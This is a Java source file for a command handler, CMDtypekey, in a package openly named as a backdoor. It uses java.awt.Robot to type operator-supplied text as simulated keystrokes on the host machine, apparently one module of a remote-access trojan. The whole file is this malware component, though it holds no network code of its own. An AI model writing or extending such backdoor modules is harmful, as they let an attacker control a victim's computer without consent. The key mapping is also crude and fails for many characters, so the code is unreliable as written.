package net.jaguargaming.backdoor.commandhandlers;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.KeyEvent;

public class CMDtypekey {
	
	public static void handle(String[] args) throws IllegalArgumentException, AWTException {
		if (args.length == 0) {
			throw new IllegalArgumentException("Wrong argument length");
		}
		String type = "";
		for (String str : args) {
			type += str;
			type += " ";
		}
		try {
			Robot robot = new Robot();
			for (int i = 0; i < type.length(); i++) {
				char c = type.charAt(i);
		        if (Character.isUpperCase(c)) {
		            robot.keyPress(KeyEvent.VK_SHIFT);
		        }
		        robot.keyPress(Character.toUpperCase(c));
		        robot.keyRelease(Character.toUpperCase(c));

		        if (Character.isUpperCase(c)) {
		            robot.keyRelease(KeyEvent.VK_SHIFT);
		        }
			}
		} catch (AWTException e) {
			throw e;
		} catch (NumberFormatException e) {
			throw e;
		}
	}
	
}
